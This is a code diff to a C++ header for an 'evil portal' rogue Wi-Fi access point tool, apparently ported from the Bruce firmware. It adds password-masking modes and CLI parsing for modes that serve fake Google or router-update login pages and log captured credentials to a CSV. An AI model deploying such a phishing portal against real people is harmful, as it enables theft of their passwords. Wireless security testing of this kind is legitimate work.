@@ -41,6 +41,10 @@ struct HttpResponse {
     std::string body;
 };
 
+// Bruce's evilPortalPasswordMode: how a submitted password is masked before it
+// is stored or displayed. Verification always uses the raw password.
+enum class PwdMode { Full, FirstLast, Hidden, Length };
+
 // Everything the portal needs to run. `html_page` is what "/"/unknown paths
 // serve (Bruce's htmlPage): the default Google page, the Router Update page
 // or a custom HTML file. `output_file` is the CSV name inside creds_dir for
@@ -53,9 +57,15 @@ struct PortalOptions {
     std::string html_page;
     std::string output_file = "default_creds.csv";
     bool verify_mode = false;
+    PwdMode pwd_mode = PwdMode::Full; // --pwd-mode (default FULL)
     std::string creds_dir;      // $HOME/.bruce/BruceEvilCreds (set by evil_portal_main)
     std::string country;        // optional --country <CC>; resolved by PortalNet otherwise
 };
+
+// Run-log labels from Bruce's drawScreen(): "Full", "p******d", "*hidden*",
+// "Length only"; and "Attempt" in verify mode instead of "Victims".
+const char* pwd_mode_label(PwdMode mode);
+const char* counter_label(bool verify_mode);
 
 // Live counters shown in the run log (Bruce's screen shows the same numbers).
 struct PortalState {
@@ -373,11 +383,28 @@ HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts,
 
 // --- entry point -------------------------------------------------------------
 
+// Parsed `--evil-portal` arguments (the tokens after <mode>). Pure: no I/O and
+// no exits, so the self-check can exercise the real flag loop without root.
+struct PortalCli {
+    PortalOptions opts;
+    std::string iface;
+    std::vector<std::string> pos; // positionals: SSID / custom file / clone channel
+    bool ok = true;
+    bool show_usage = false;      // parse error that should also print usage()
+    std::string error;
+};
+
+// Parse the arguments after <mode>: --gateway/--iface/--channel/--country/
+// --pwd-mode, then positionals. Does NOT set opts.html_page/opts.creds_dir.
+PortalCli parse_portal_cli(int argc, char** argv, const std::string& default_iface);
+
 // `--evil-portal <mode> [args...]`
 //   default [ssid]          Google page AP (Bruce "Default")
 //   verify  [ssid]          Router-Update page + password check ("Default (one)")
 //   custom  <file> [ssid]   HTML from file, <!-- AP="..." --> sets the name
 //   clone   <ssid> [chan]   clone a scanned AP ("Clone Portal")
+// options: --gateway IP --iface DEV --channel N --country CC
+//          --pwd-mode full|first_last|hidden|length (default full)
 // Long-running: streams the portal log until SIGTERM/SIGINT.
 int evil_portal_main(int argc, char** argv);
 
